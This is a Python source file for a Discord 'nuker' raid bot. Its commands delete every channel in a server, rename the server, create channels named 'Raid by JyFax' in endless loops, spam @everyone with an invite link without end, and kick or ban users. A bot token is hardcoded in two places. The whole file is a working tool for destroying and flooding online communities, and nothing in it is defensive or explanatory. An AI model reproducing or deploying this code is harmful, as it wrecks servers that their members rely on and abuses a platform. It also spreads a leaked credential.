import asyncio
import time 
import logging
import colorama
import random 
import os
import discord
from discord import Permissions
from discord import Webhook, AsyncWebhookAdapter
from discord.ext import commands, tasks
from discord.ext.commands import bot
from itertools import cycle
from colorama import Fore as C
from colorama import Style as S
import sys
import json

token = "ODMzNDI2Mjc5MTU5NjkzMzUz.YHyKtQ.2XA0c9Lo0vzfHslTAo-VYBMiw7o"
bio = ['Regarde /help']
channel_names = ['Raid by JyFax', "Your server is die"]

print('connecting to nuker')
os.system("cls")

prefix = "/"

client = commands.Bot(command_prefix=prefix)

@client.event
async def on_connect():
    print(f"{client.user} is online and ready")

@client.event
async def on_ready():
    await client.change_presence(
        activity=discord.Activity(
            type=discord.ActivityType.playing, name=random.choice(bio)))



@client.command(pass_context=True)
async def nuke(ctx):
    guild = ctx.message.guild
    await ctx.message.delete()

    for channel in list(ctx.message.guild.channels):
       try:
           await channel.delete()
           print(f"{channel.name} Has been deleted.")
       except:
            pass
    
    
    for i in range(1):
        try:
            await ctx.guild.edit(name="JyFax <3")
            print("Name Changed!")
        except:
            print("name wasnt changed")

    for i in range(1):
        await guild.create_text_channel(random.choice(channel_names))
    while True:
        for channel in guild.text_channels:
            for i in range(200):
                await guild.create_text_channel(random.choice(channel_names))

@client.command(pass_context=True)
async def cdel(ctx):
    guild = ctx.message.guild
    await ctx.message.delete()

    for channel in list(ctx.message.guild.channels):
        try:
           await channel.delete()
           print(f"{channel.name} Has been deleted.")
        except:
            pass

@client.command(pass_context=True)
async def ccr(ctx):
    guild = ctx.message.guild
    await ctx.message.delete()
    for i in range(1):
        await guild.create_text_channel(random.choice(channel_names))
    while True:
        for channel in guild.text_channels:
            for i in range(500):
                await guild.create_text_channel(random.choice(channel_names))


@client.command()
async def kick(ctx, user : discord.User, reason=None):
    await ctx.guild.kick(user, reason = reason)
    await ctx.send(f"{user} à été kick.")

@client.command()
async def ban(ctx, user : discord.User, reason=None):
    await ctx.guild.ban(user, reason = reason)
    await ctx.send(f"{user} à dégagé son cul")


@client.command(pass_context=True)
async def spam(ctx):
    guild = ctx.message.guild
    await ctx.message.delete()
    for i in range(2):
        print("Spammed Channels!")
        while True:
            for channel in guild.text_channels:
                await channel.send("https://discord.gg/YBNYJpfyGW @everyone")
        


client.run("ODMzNDI2Mjc5MTU5NjkzMzUz.YHyKtQ.2XA0c9Lo0vzfHslTAo-VYBMiw7o")
